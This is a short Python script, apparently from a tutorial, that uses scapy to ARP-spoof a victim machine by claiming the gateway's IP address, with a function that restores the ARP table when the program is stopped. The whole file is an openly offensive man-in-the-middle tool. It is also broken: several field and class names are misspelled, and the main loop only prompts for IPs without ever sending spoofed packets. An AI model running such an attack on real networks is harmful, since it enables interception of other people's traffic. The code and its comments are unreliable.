import scapy.all as scapy
import sys,time


def mac(victim_ip): # Create a function for getting the mac address of the target
    arp_request=scapy.ARP(psdt=victim_ip) #  Creating  ARP request
    broadcast=scapy.Either(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request  # till now we created a ARP  request now by this we are making  a ARP packet
    # scapy has an option to collect only responded packets for more details please refer previous tutorial
    answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc
def arp_spoof(victim_ip,spoof_ip):
    packet = scapy.ARP(op=2,pdst=victim_ip,hwst=mac(victim_ip=victim_ip),psrc=spoof_ip)
    # op =2 because we need response of the packet , if not need we set as op=1
    # pdst= the target machine IP address
    # hwst = target machine mac address
    #psrc= gateway ip address
    scapy.send(packet)
    # Scapy.send will send the packet to change the mac address.
def restore(destination_ip,source_ip):
    '''this is the most important as when we completed the attack we need to restore the mac address in ARP Table so we crate a another
    packet which will restore the ARP table with this packet'''
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=mac(victim_ip=destination_ip),psrc=source_ip,hwsrc=mac(victim_ip=source_ip))
    scapy.send(packet,count=4,verbose=False)
try:
    while True:
        pack_count=0
        victim_ip=input("[+] Enter the target IP to be spoofed: ")
        spoof_ip=input("[+] Enter the gateway ip address: ")
        pack_count+=1
        print(f"[+] packets sent count is : {pack_count}")
        sys.stdout.flush() # This will clear the buffer of the print statement
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Program terminated because of CTRL+c")
    restore(destination_ip = victim_ip,source_ip = spoof_ip)
    print("[+] Mac was restored ")